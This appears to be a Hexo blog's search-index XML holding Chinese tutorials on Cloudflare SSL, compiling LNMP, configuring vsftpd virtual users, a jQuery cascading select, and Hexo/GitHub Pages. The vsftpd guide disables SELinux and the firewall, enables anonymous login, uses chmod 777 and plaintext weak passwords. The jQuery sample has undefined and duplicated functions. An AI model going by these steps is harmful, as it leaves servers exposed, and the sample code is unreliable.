id="为什么使用SSL"><a href="#为什么使用SSL" class="headerlink" title="为什么使用SSL"></a>为什么使用SSL</h4><ol><li>SSL是大势所趋，Chrome即将把所有HTTP都标记为不安全。</li><li>SSL可以提高搜索引擎排名。</li></ol><h4 id="使用Cloudflare添加SSL"><a href="#使用Cloudflare添加SSL" class="headerlink" title="使用Cloudflare添加SSL"></a>使用Cloudflare添加SSL</h4><ol><li>注册并登陆Cloudflare，填入你的域名，选择免费计划。</li><li>在阿里云域名管理处将DNS服务器修改为Cloudflare的DNS。<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="../../images/201802241359_476.png" alt title>                </div>                <div class="image-caption"></div>            </figure></li><li>在Cloudflare中将Crypto设置为flexible<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="../../images/201802241401_562.png" alt title>                </div>                <div class="image-caption"></div>            </figure></li><li>设置页面规则<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="../../images/201802241404_610.png" alt title>                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="../../images/201802241404_992.png" alt title>                </div>                <div class="image-caption"></div>            </figure></li><li>稍等5-30分钟即可生效</li></ol>]]></content>
      
      
      <categories>
          
          <category> 博客搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux服务部署之LNMP搭建(编译安装)</title>
      <link href="20180109/Linux%E6%9C%8D%E5%8A%A1%E9%83%A8%E7%BD%B2%E4%B9%8BLNMP%E6%90%AD%E5%BB%BA.html"/>
      <url>20180109/Linux%E6%9C%8D%E5%8A%A1%E9%83%A8%E7%BD%B2%E4%B9%8BLNMP%E6%90%AD%E5%BB%BA.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>LNMP算是比较容易的一个服务了，没有使用YUM直接安装还是比较痛苦的。</p><a id="more"></a><h2 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h2><h3 id="AliSQL"><a href="#AliSQL" class="headerlink" title="AliSQL"></a>AliSQL</h3><ol><li>安装编译源码所需库和工具<pre><code class="bash">yum install gcc gcc-c++ ncurses-devel perl </code></pre></li></ol><p>还需要安装cmake和bison，因为已经自带了，所以不详述，详见参考文档<br>2. 增加mysql组和用户</p><pre><code class="bash">groupadd mysql useradd -r -g mysql mysql </code></pre><ol start="3"><li><p>建立安装目录和数据文件目录</p><pre><code class="bash">mkdir –p /usr/local/mysql mkdir -p /data/mysqldb </code></pre></li><li><p>下载解压并编译源码</p><pre><code class="bash">git clone https://github.com/alibaba/AliSQLunzip AliSQL-master.zipcd AliSQL-mastercmake -DCMAKE_INSTALL_PREFIX=/usr/local/mysql -DMYSQL_UNIX_ADDR=/usr/local/mysql/mysql.sock -DDEFAULT_CHARSET=utf8 -DDEFAULT_COLLATION=utf8_general_ci -DWITH_INNOBASE_STORAGE_ENGINE=1 -DWITH_ARCHIVE_STORAGE_ENGINE=1 -DWITH_BLACKHOLE_STORAGE_ENGINE=1 -DMYSQL_DATADIR=/data/mysqldb -DMYSQL_TCP_PORT=3306 -DENABLE_DOWNLOADS=1 makemake install</code></pre></li><li><p>修改相关目录属主和数组</p><pre><code class="bash">chown -R mysql:mysql /usr/local/mysqlchown -R mysql:mysql /data/mysqldb</code></pre></li><li><p>初始化AliSQL数据库</p><pre><code class="bash">cd /usr/local/mysqlscripts/mysql_install_db –user=mysql –datadir=/data/mysqldb </code></pre></li></ol><p>成功初始化后，提示以下信息，记下来以备后用。</p><pre><code class="bash">To start mysqld at boot time you have to copysupport-files/mysql.server to the right place for your systemPLEASE REMEMBER TO SET A PASSWORD FOR THE MySQL root USER !To do so, start the server, then issue the following commands:  ./bin/mysqladmin -u root password &#39;new-password&#39;  ./bin/mysqladmin -u root -h localhost.localdomain password &#39;new-password&#39;Alternatively you can run:  ./bin/mysql_secure_installationwhich will also give you the option of removing the testdatabases and anonymous user created by default.  This isstrongly recommended for production servers.See the manual for more instructions.You can start the MySQL daemon with:  cd . ; ./bin/mysqld_safe &amp;You can test the MySQL daemon with mysql-test-run.pl  cd mysql-test ; perl mysql-test-run.plPlease report any problems at http://bugs.mysql.com/The latest information about MySQL is available on the web at  http://www.mysql.comSupport MySQL by buying support/licenses at http://shop.mysql.comNew default config file was created as ./my.cnf andwill be used by default by the server when you start it.You may edit this file to change server settings</code></pre><ol start="7"><li>复制AliSQL服务启动配置文件、脚本，并加入PATH<pre><code class="bash">cp /usr/local/mysql/support-files/my-default.cnf /etc/my.cnf cp support-files/mysql.server /etc/init.d/mysqldvim /etc/profile </code></pre></li></ol><p>#加入这行<br>PATH=/usr/local/mysql/bin:/usr/local/mysql/lib:$PATH </p><p>export PATH<br>source/etc/profile </p><pre><code>8. 启动AliSQL服务并加入开机自启```bashservice mysqld start chkconfig –level 35 mysqld on </code></pre><ol start="9"><li>检查是否已启动<pre><code class="bash">netstat -tulnp | grep 3306 mysql -u root -p</code></pre></li></ol><h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><ol><li><p>下载包并解压</p><pre><code class="bash">tar zxvf nginx-1.12.2.tar.gzcd ./nginx-1.12.2</code></pre></li><li><p>编译安装</p><pre><code class="bash">./configure  --prefix=/usr/local/nginx  --sbin-path=/usr/local/nginx/sbin/nginx --conf-path=/usr/local/nginx/conf/nginx.conf --error-log-path=/var/log/nginx/error.log  --http-log-path=/var/log/nginx/access.log  --pid-path=/var/run/nginx/nginx.pid --lock-path=/var/lock/nginx.lock  --user=nginx --group=nginx --with-http_ssl_module --with-http_stub_status_module --with-http_gzip_static_module --http-client-body-temp-path=/var/tmp/nginx/client/ --http-proxy-temp-path=/var/tmp/nginx/proxy/ --http-fastcgi-temp-path=/var/tmp/nginx/fcgi/ --http-uwsgi-temp-path=/var/tmp/nginx/uwsgi --http-scgi-temp-path=/var/tmp/nginx/scgi --with-pcre</code></pre><p>可能需要依赖文件如下</p><pre><code class="bash">yum install gcc gcc-c++ automake pcre pcre-devel zlip zlib-devel openssl openssl-devel </code></pre><p>安装完毕后有相关的提示信息，马克以备后用</p><pre><code class="bash">Configuration summary+ using system PCRE library+ using system OpenSSL library+ using system zlib librarynginx path prefix: &quot;/usr/local/nginx&quot;nginx binary file: &quot;/usr/local/nginx/sbin/nginx&quot;nginx modules path: &quot;/usr/local/nginx/modules&quot;nginx configuration prefix: &quot;/usr/local/nginx/conf&quot;nginx configuration file: &quot;/usr/local/nginx/conf/nginx.conf&quot;nginx pid file: &quot;/var/run/nginx/nginx.pid&quot;nginx error log file: &quot;/var/log/nginx/error.log&quot;nginx http access log file: &quot;/var/log/nginx/access.log&quot;nginx http client request body temporary files: &quot;/var/tmp/nginx/client/&quot;nginx http proxy temporary files: &quot;/var/tmp/nginx/proxy/&quot;nginx http fastcgi temporary files: &quot;/var/tmp/nginx/fcgi/&quot;nginx http uwsgi temporary files: &quot;/var/tmp/nginx/uwsgi&quot;nginx http scgi temporary files: &quot;/var/tmp/nginx/scgi&quot;</code></pre></li><li><p>修改监听端口</p><pre><code class="bash">vim /usr/local/nginx/conf/nginx.conf</code></pre></li></ol><h1 id="listen把80改为8090，以防冲突"><a href="#listen把80改为8090，以防冲突" class="headerlink" title="listen把80改为8090，以防冲突"></a>listen把80改为8090，以防冲突</h1><p>server {<br>    listen       8090;</p><pre><code>4. 启动nginx```bashln -sf /usr/local/nginx/sbin/nginx  /usr/sbin# 启动nginx# 重载配置nginx -s reload# 停止nginx -s stop</code></pre><p>执行错误有：</p><ul><li><code>nginx: [emerg] getpwnam(&quot;nginx&quot;) failed</code>：表示没有nginx用户（<code>useradd -s /sbin/nologin -M nginx</code>)</li><li><code>nginx: [emerg] mkdir() &quot;/var/tmp/nginx/client/&quot; failed (2: No such file or directory)</code>：表示没有该目录(<code>mkdir -p</code>)</li></ul><ol start="5"><li><p>验证nginx是否开启、端口是否监听</p><pre><code class="bash">ps -ef | grep nginxnetstat -antl | grep 8090</code></pre><p>直接访问<code>ip:8090</code>显示<code>Welcome to Nginx</code>表明安装成功</p></li><li><p>更复杂的配置详看参考文档2</p></li></ol><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><ol><li><p>下载PHP压缩包解压并进入目录</p></li><li><p>编译安装<br>为了整合mysql 记得要带上<code>--with-mysql=YOUR_MYSQL_PATH</code></p><pre><code class="bash">./configure --prefix=/usr/local/php --with-config-file-path=/usr/local/php/etc --enable-fpm --with-fpm-user=php-fpm --with-fpm-group=php-fpm --with-mysql=/usr/local/mysql --with-libxml-dir --enable-soap --enable-gd-native-ttf --enable-ftp --enable-mbstring --enable-exif --disable-ipv6 --with-curl --with-openssl</code></pre><p>同样可能需要安装依赖文件，见机行事</p><pre><code class="bash">yum -y install libxml2 libxml2-devel curl curl-devel </code></pre><p>安装后有提示信息，同样马克</p><pre><code class="bash">You may want to add: /usr/local/php/lib/php to your php.ini include_path/usr/local/src/php-5.6.0/build/shtool install -c ext/phar/phar.phar /usr/local/php/binln -s -f /usr/local/php/bin/phar.phar /usr/local/php/bin/pharInstalling PDO headers:  /usr/local/php/include/php/ext/pdo/</code></pre></li><li><p>修改配置文件</p><pre><code class="bash">cp php-5.6.0/php.ini-production /usr/local/php/etc/php.inicp /usr/local/php/etc/php-fpm.conf.default /usr/local/php/etc/php-fpm.conf</code></pre><p>使用<code>/usr/local/php/sbin/php-fpm -t</code>测试是否成功，不成功则</p><pre><code class="bash">vim /usr/local/php/etc/php-fpm.conf# 将其中user和group改成系统用户</code></pre></li><li><p>启用php-fpm </p><pre><code class="bash">service php-fpm start</code></pre></li></ol><p>#开机启动和检测是否已启动<br>chkconfig php-fpm on<br>ps aux | grep php-fpm<br>netstat -ant |grep 9000</p><pre><code>5. 加入环境变量```bashvim /etc/profile##添加以下两行PATH=/usr/local/webserver/php/bin:$PATHexport PATHsource /etc/profile# 写个代码检验一下php test.php</code></pre><h3 id="更改Nginx配置"><a href="#更改Nginx配置" class="headerlink" title="更改Nginx配置"></a>更改Nginx配置</h3><p>整合成LNMP，.conf的详细参数配置看参考文档2</p><pre><code class="bash">&gt; /usr/local/nginx/conf/nginx.confvim /usr/local/nginx/conf/nginx.confuser nobody nobody;worker_processes 2;error_log /usr/local/nginx/logs/nginx_error.log crit;pid /usr/local/nginx/logs/nginx.pid;worker_rlimit_nofile 51200;events{    use epoll;    worker_connections 6000;}http{    include mime.types;    default_type application/octet-stream;    server_names_hash_bucket_size 3526;    server_names_hash_max_size 4096;    log_format combined_realip &#39;$remote_addr $http_x_forwarded_for [$time_local]&#39;    &#39;$host &quot;$request_uri&quot; $status&#39;    &#39;&quot;$http_referer&quot; &quot;$http_user_agent&quot;&#39;;    sendfile on;    tcp_nopush on;    keepalive_timeout 30;    client_header_timeout 3m;    client_body_timeout 3m;    send_timeout 3m;    connection_pool_size 256;    client_header_buffer_size 1k;    large_client_header_buffers 8 4k;    request_pool_size 4k;    output_buffers 4 32k;    postpone_output 1460;    client_max_body_size 10m;    client_body_buffer_size 256k;    client_body_temp_path /usr/local/nginx/client_body_temp;    proxy_temp_path /usr/local/nginx/proxy_temp;    fastcgi_temp_path /usr/local/nginx/fastcgi_temp;    fastcgi_intercept_errors on;    tcp_nodelay on;    gzip on;    gzip_min_length 1k;    gzip_buffers 4 8k;    gzip_comp_level 5;    gzip_http_version 1.1;    gzip_types text/plain application/x-javascript text/css text/htm application/xml;    server    {        # 端口        listen 80;        server_name localhost;        index index.html index.htm index.php;        # 网站根地址        root /usr/local/nginx/html;        location ~ \.php$ {            include fastcgi_params;            fastcgi_pass 127.0.0.1:9000;            fastcgi_index index.php;            fastcgi_param SCRIPT_FILENAME /usr/local/nginx/html$fastcgi_script_name;        }    }}</code></pre><p>在<code>/usr/local/nginx/html</code>创建<code>test.php</code>，内容如下</p><pre><code class="php">&lt;?php    echo phpinfo();?&gt;</code></pre><p>查看<code>http://ip/test.php</code>是否出现phpinfo，并且在里面查看mysql是否正确配置。</p><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><ul><li><a href="http://blog.csdn.net/tanyhuan/article/details/64942722" target="_blank" rel="noopener">AliSQL 安装</a></li><li><a href="https://www.cnblogs.com/zhang-shijie/p/5294162.html" target="_blank" rel="noopener">Nginx 安装</a></li><li><a href="http://blog.csdn.net/dyllove98/article/details/41120789" target="_blank" rel="noopener">5分钟搭建 nginx +php</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux服务部署之VSFTP搭建(编译安装)</title>
      <link href="20180108/20180108-Linux%E6%9C%8D%E5%8A%A1%E9%83%A8%E7%BD%B2%E4%B9%8BVSFTP%E6%90%AD%E5%BB%BA.html"/>
      <url>20180108/20180108-Linux%E6%9C%8D%E5%8A%A1%E9%83%A8%E7%BD%B2%E4%B9%8BVSFTP%E6%90%AD%E5%BB%BA.html</url>
      
        <content type="html"><![CDATA[<h2 id="系统环境和预计目标"><a href="#系统环境和预计目标" class="headerlink" title="系统环境和预计目标"></a>系统环境和预计目标</h2><ol><li>CentOS 7.4</li><li>ftp 根目录 :  <code>/data/ftp</code></li><li>ftp 配置文件目录： <code>/etc/vsftpd</code></li><li>ftp 虚拟用户权限配置文件目录： <code>/etc/vsftpd/vuser_config</code></li></ol><a id="more"></a><h2 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h2><ol><li><p>安装vsftpd和db_load加密工具</p><pre><code class="bash">#修改配置文件sed -i &#39;s/SELINUX=enforcing/SELINUX=disabled/&#39; /etc/selinux/config #临时关闭setenforce 0  #关闭防火墙systemctl stop firewalld.service yum install vsftpd -y</code></pre></li><li><p>创建本地用户用于映射虚拟用户</p><pre><code class="bash"># 创建ftp用户目录mkdir -p /data/ftp# 创建用户useradd -d /data/ftp vuser -s /sbin/nologin# 更改权限和主组权限chmod 755 /data/ftpchown vuser.root /data/ftp</code></pre></li><li><p>创建虚拟用户文件</p><pre><code class="bash">vim /etc/vsftpd/vuser-list</code></pre></li></ol><h1 id="用户名一行，密码一行"><a href="#用户名一行，密码一行" class="headerlink" title="用户名一行，密码一行"></a>用户名一行，密码一行</h1><p>li<br>123123123<br>li1<br>123123123</p><pre><code>4. 加密用户密码文件生成数据库文件```bashcd /etc/vsftpddb_load -T -t hash -f ./vuser-list ./vuser-list.dbchmod 600 vuser-list.db</code></pre><ol start="5"><li>创建PAM认证文件<pre><code class="bash">vim /etc/pam.d/vuser.vu</code></pre></li></ol><h1 id="PAM认证模块"><a href="#PAM认证模块" class="headerlink" title="PAM认证模块"></a>PAM认证模块</h1><p>#注意64位系统写/lib64这个路径，32位系统要写成/lib<br>auth required /lib64/security/pam_userdb.so db=/etc/vsftpd/vuser-list<br>account required /lib64/security/pam_userdb.so db=/etc/vsftpd/vuser-list</p><pre><code>6. 修改配置文件```bash# 先备份mv /etc/vsftpd/vsftpd.conf /etc/vsftpd/vsftpd.conf-bakvim /etc/vsftpd/vsftpd.conf#是否开启匿名登陆anonymous_enable=YESlocal_enable=YESwrite_enable=YESlocal_umask=022dirmessage_enable=YESxferlog_enable=YESconnect_from_port_20=YES#登陆日志地址xferlog_file=/var/log/xferlogxferlog_std_format=YESlisten=YESlisten_ipv6=NO#修改ftp默认目录到/data/ftp下面chroot_local_user=YES#使用户不能离开主目录chroot_list_enable=YES#设定支持ASCIIascii_upload_enable=YESascii_download_enable=YESlocal_root=/data/ftpanon_root=/data/ftp#pam认证文件pam_service_name=vuser.vu#虚拟用户权限配置目录user_config_dir=/etc/vsftpd/vuser_configuserlist_enable=YEStcp_wrappers=YESallow_writeable_chroot=YESone_process_model=NO#开启虚拟用户guest_enable=YESguest_username=vuser</code></pre><ol start="7"><li>创建虚拟用户权限的配置文件<pre><code class="bash">mkdir /etc/vsftpd/vuser_configcd /etc/vsftpd/vuser_config</code></pre></li></ol><p>mkdir -p /data/ftp/li<br>mkdir -p /data/ftp/li1<br>chmod 777 /data/ftp/li<br>chmod 777 /data/ftp/li1</p><p>vim li </p><h1 id="有所有权限"><a href="#有所有权限" class="headerlink" title="[有所有权限]"></a>[有所有权限]</h1><p>#设置登录后禁锢的目录<br>local_root=/data/ftp/li<br>#开放写权限<br>write_enable=yes<br>#开放下载权限<br>anon_world_readable_only=no<br>#开放上传权限<br>anon_upload_enable=yes<br>#开放创建目录的权限<br>anon_mkdir_write_enable=yes<br>#开放删除和重命名的权限<br>anon_other_write_enable=yes</p><p>vim li1</p><h1 id="只有上传下载的权限"><a href="#只有上传下载的权限" class="headerlink" title="[只有上传下载的权限]"></a>[只有上传下载的权限]</h1><p>local_root=/data/ftp/li1<br>anon_upload_enable=yes<br>anon_world_readable_only=no</p><pre><code>8. 更改虚拟用户目录权限，目的是不让匿名用户进行访问```bashchmod 700 lichmod 700 li1</code></pre><ol start="9"><li><p>设置ftp自启动<code>systemctl enable vsftpd</code>，打开ftp服务 <code>systemctl start vsftpd</code>，为了验证是否启动，使用<code>systemctl status vsftpd.service</code>查看是否已开启。</p></li><li><p>使用xftp或ftp命令进行测试，使用li时可以进行任何操作，包括新建文件夹；使用li1时只能上传和下载，不能新建文件夹，测试有问题则对6和7进行排错。</p></li></ol><h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><ol><li>useradd可能会出现<code>useradd: warning: the home directory already exists.</code>，是因为默认配置home目录在 <code>/home</code>，导致冲突。第二是因为没有skel目录。没有太大的关系，用户已经成功创建。如果十分纠结这点可以对其建自己的home目录，手动拷贝skel相关文件到home目录下。</li><li><code>550 OOPS: Permission Denied</code>上传失败或创建文件夹失败，可能是selinux的问题。</li></ol><ul><li>关闭selinux：修改 <code>/etc/selinux/config</code>文件中的 <code>SELINUX=&quot;&quot;</code> 为  <code>disabled</code>，使用 <code>setenforce 0</code>重启，使用 <code>getenforce</code>查看是否成功disable掉。值得注意的是需要关闭ftp窗口，重新链接才能生效。</li><li>不关闭selinux：修改selinux配置，详见参考文档2。</li></ul><ol start="3"><li><code>226 Transfer done (but failed to open directory)</code>，selinux和防火墙的问题，重新配置一下第一步。</li><li><code>500 OOPS vsftpd: refusing to run with writable root inside chroot()</code>，配置文件中加入 <code>allow_writeable_chroot=YES</code>,创建相应文件<pre><code>touch /etc/vsftpd/chroot_listchmod 644 /etc/vsftpd/chroot_list</code></pre></li><li>在操作过程中遇到 <code>No such file or directory</code>，表示不存在目录，可使用 <code>mkdir -p</code>进行创建。</li><li>遇到该问题时候，查看6修改配置处是否有错误，拼写错误也可能导致该错误。<pre><code class="bash">[root@localhost vsftpd]# systemctl status vsftpd.service● vsftpd.service - Vsftpd ftp daemonLoaded: loaded (/usr/lib/systemd/system/vsftpd.service; enabled; vendor preset: disabled)Active: failed (Result: exit-code) since Mon 2018-01-08 16:22:04 CST; 3min 24s agoProcess: 1202 ExecStart=/usr/sbin/vsftpd /etc/vsftpd/vsftpd.conf (code=exited, status=2)</code></pre></li></ol><p>Jan 08 16:22:04 localhost.localdomain systemd[1]: Starting Vsftpd ftp daemon…<br>Jan 08 16:22:04 localhost.localdomain systemd[1]: vsftpd.service: control process exited, code=exited status=2<br>Jan 08 16:22:04 localhost.localdomain systemd[1]: Failed to start Vsftpd ftp daemon.<br>Jan 08 16:22:04 localhost.localdomain systemd[1]: Unit vsftpd.service entered failed state.<br>Jan 08 16:22:04 localhost.localdomain systemd[1]: vsftpd.service failed.</p><p>```<br>7. 出现pam验证通过，但是不能连接的可能是因为配置第七点有一个大坑，是每一行包括文件末尾不能有空格，命令行下会报 <code>500 OOPS: bad bool value in config file for: anon_world_readable_only</code><br>8. <code>550 Create directory operation failed.</code>：目录权限没给写权限，使用 <code>chmod 777 /data/ftp/li</code>即可</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ul><li>ftp最好使用命令行，这样返回错误码和错误信息容易排错。</li><li>多看日志判断信息。包括 <code>tail -f /var/log/secure</code> 和 <code>systemctl status vsftpd</code></li></ul><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><ul><li><a href="http://blog.csdn.net/aerchi/article/details/78042443" target="_blank" rel="noopener">centos7 安装vsftpd和配置虚拟用户访问及权限分配</a></li><li><a href="http://blog.163.com/haizhifeng6@126/blog/static/45615427201489111836632/" target="_blank" rel="noopener">selinux配置 VSFTP不能上传</a></li><li><a href="http://man.linuxde.net/systemctl" target="_blank" rel="noopener">systemctl命令</a></li><li><a href="http://www.linuxidc.com/Linux/2015-12/126357.htm" target="_blank" rel="noopener">如何在命令行中使用 ftp 命令上传和下载文件</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VSFTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JQUERY实现SELECT框三级联动</title>
      <link href="20171219/JQUERY%E5%AE%9E%E7%8E%B0SELECT%E6%A1%86%E4%B8%89%E7%BA%A7%E8%81%94%E5%8A%A8.html"/>
      <url>20171219/JQUERY%E5%AE%9E%E7%8E%B0SELECT%E6%A1%86%E4%B8%89%E7%BA%A7%E8%81%94%E5%8A%A8.html</url>
      
        <content type="html"><![CDATA[<p>最近做了一个外包项目，其中写了一个模块是select框国家-省-市的三级联动，其中操作用到了JQuery，数据文件是引入了JSON，没有进行后端交互。如果用到后端交互的话，每次change的函数改成ajax请求即可。因为项目代码的保密，没有写得特别清楚，但结构应该也比较清晰了。</p><a id="more"></a><h2 id="JSON格式"><a href="#JSON格式" class="headerlink" title="JSON格式"></a>JSON格式</h2><p>由于数据是用脚本分几个文档处理出来的，所以JSON文件的格式是形如以下形式，分为了国家-省.json，省-市.json，一般情况下整合在一起会比较合适，操作起来也比较方便。</p><pre><code class="JSON">[{    &quot;country&quot;:&quot;China&quot;,    &quot;provinces&quot;:[        &quot;Guangdong&quot;,        &quot;Beijing&quot;,        &quot;Shanghai&quot;    ]},{...}]</code></pre><h2 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h2><pre><code class="html">&lt;div class=&quot;select-list&quot;&gt;    &lt;select name=&quot;country&quot;&gt;&lt;/select&gt;    &lt;select name=&quot;provinces&quot;&gt;&lt;/select&gt;    &lt;select name=&quot;cities&quot;&gt;&lt;/select&gt;&lt;/div&gt;</code></pre><h2 id="JS"><a href="#JS" class="headerlink" title="JS"></a>JS</h2><pre><code class="Javascript">var countrySel = $(&#39;select[name=country]&#39;);var provincesSel = $(&#39;select[name=provinces]&#39;);var citiesSel = $(&#39;select[name=cities]&#39;);var changePro = function () {    var optionData = &quot;&quot;;    // 遍历JSON    $.each(country2pro, function (idx, reg) {        optionData += &quot;&lt;option value=&#39;&quot; + reg.country + &quot;&#39;&gt;&quot; + reg.country + &quot;&lt;/option&gt;&quot;;    });    countrySel.empty();    countrySel.html(optionData);    changePro();};var changePro = function () {    var optionData = &quot;&quot;;    var idx = countrySel.get(0).selectedIndex;    country2pro[idx].provinces.sort();    country2pro[idx].provinces.forEach(function (item) {        optionData += &quot;&lt;option value=&#39;&quot;+item+&quot;&#39;&gt;&quot; + item + &quot;&lt;/option&gt;&quot;;    });    provincesSel.empty();    provincesSel.html(optionData);    changeCity();};var changeCity = function () {    var optionData = &quot;&quot;;    // 获取province值    var province = provincesSel.val();    $.each(prov2cities, function (idx, opt) {       if (opt.province == province) {           opt.cities.sort();           opt.cities.forEach(function (item) {               optionData += &quot;&lt;option value=&#39;&quot;+item+&quot;&#39;&gt;&quot; + item + &quot;&lt;/option&gt;&quot;;           });           return false;       }    });    citiesSel.empty();    citiesSel.html(optionData);};//文档加载时执行时事件window.onload = function () {    changeRegion();}//select框change事件regionSel.change(function () {    changePro();});countrySel.change(function () {    changeCity();});</code></pre><h2 id="一些小知识点"><a href="#一些小知识点" class="headerlink" title="一些小知识点"></a>一些小知识点</h2><ul><li>$.each遍历JSON的时候通过return进行类似for循环的break和continue</li><li>select框change的时候必须要清除框内的值</li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github Pages搭建</title>
      <link href="20171216/Github%20Pages%E6%90%AD%E5%BB%BA.html"/>
      <url>20171216/Github%20Pages%E6%90%AD%E5%BB%BA.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近正在重新系统地学习一遍Linux，自己也经常在有道里面做做笔记。如今拥抱开源、知识分享也是一种趋势，搭建一个博客写写自己学到的知识、整理一下笔记也是挺不错的。于是今晚用一个小时利用Github Pages配置搭建好了Yilia主题的博客，简单记录一下操作和一些坑，希望能给别人一些帮助。</p><a id="more"></a><h2 id="Github操作"><a href="#Github操作" class="headerlink" title="Github操作"></a>Github操作</h2><ul><li>创建仓库，仓库名为 githubname.github.io</li><li>在仓库Setttings#Github Pages-&gt;choose a theme，完成配置</li></ul><h2 id="HEXO操作"><a href="#HEXO操作" class="headerlink" title="HEXO操作"></a>HEXO操作</h2><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><ul><li>install Node.js, git</li><li>git需要进行配置SSH，链接到你的github。使用<code>git config --list</code>查看是否已配置成功</li></ul><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><ul><li>进行hexo配置<pre><code>  npm install -g hexo-cli  cd create_a_hexo_path  hexo init  npm install  hexo server</code></pre>  打开<a href="http://localhost:4000" target="_blank" rel="noopener">http://localhost:4000</a>看是否安装成功</li><li>打开hexo文件夹下的_config.yml，这就是hexo的相关配置。找到deploy进行修改<pre><code>  deploy:     type: git    repo: git@github.com:MyGithub/MyGithub.github.io.git    branch: master  // warning:修改MyGithub为自己的账户名;在yml文件中，:后面必须要有空格</code></pre></li></ul><h3 id="更换主题"><a href="#更换主题" class="headerlink" title="更换主题"></a>更换主题</h3><ul><li>在<a href="https://github.com/hexojs/hexo/wiki/Themes" target="_blank" rel="noopener">各种themes</a>下载喜欢的主题到./themes下</li><li>需要更新主题时可以到主题文件夹下进行<code>git pull</code></li><li>在_config.yml 更改theme<pre><code>  # Extensions  ## Plugins: http://hexo.io/plugins/  ## Themes: http://hexo.io/themes/  theme: next</code></pre></li><li>本地运行验证是否可用<code>hexo s --debug</code></li></ul><h3 id="yilla配置"><a href="#yilla配置" class="headerlink" title="yilla配置"></a>yilla配置</h3><ul><li><a href="http://www.jianshu.com/p/f389ad8c49bd" target="_blank" rel="noopener">GithubPages+Hexo博客主题Yilia</a></li><li>此处建议大家挑选比较热门的主题，对应的帮助文档会比较详细规范。不同的主题配置方法大致相同，一般都是修改_config.yml文件，此处不再赘述具体的配置。</li></ul><h3 id="部署到github上"><a href="#部署到github上" class="headerlink" title="部署到github上"></a>部署到github上</h3><ul><li>每次部署都需要输入三个命令<pre><code class="bash">  hexo clean  hexo generate   //hexo g  hexo deploy     //hexo d</code></pre></li><li>如果报错，则需要安装插件<code>npm install hexo-deployer-git</code></li></ul><h3 id="博客文章放置点"><a href="#博客文章放置点" class="headerlink" title="博客文章放置点"></a>博客文章放置点</h3><ul><li>在source文件夹下的_post文件夹下放置</li></ul><h2 id="注册域名与github-pages地址绑定"><a href="#注册域名与github-pages地址绑定" class="headerlink" title="注册域名与github pages地址绑定"></a>注册域名与github pages地址绑定</h2><ul><li>待填坑</li></ul><h2 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h2><ul><li><a href="https://cczeng.github.io/2017/05/03/git/%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Github-Pages%E6%90%AD%E5%BB%BA%E8%B5%B7%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2%E2%80%94%E2%80%94%E7%BB%86%E6%95%B0%E4%B8%80%E8%B7%AF%E7%9A%84%E5%9D%91/" target="_blank" rel="noopener">我是如何利用Github Pages搭建起我的博客，细数一路的坑客</a></li><li><a href="http://barrysite.me/2017/05/07/Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/" target="_blank" rel="noopener">Github+Hexo+NEXT主题+域名绑定 博客搭建全记录</a></li><li><a href="http://www.jianshu.com/p/465830080ea9" target="_blank" rel="noopener">HEXO+Github,搭建属于自己的博客</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 博客搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2017蓝盾杯bdctf热身题</title>
      <link href="20171013/2017%E8%93%9D%E7%9B%BE%E6%9D%AFbdctf%E7%83%AD%E8%BA%AB%E9%A2%98.html"/>
      <url>20171013/2017%E8%93%9D%E7%9B%BE%E6%9D%AFbdctf%E7%83%AD%E8%BA%AB%E9%A2%98.html</url>
      
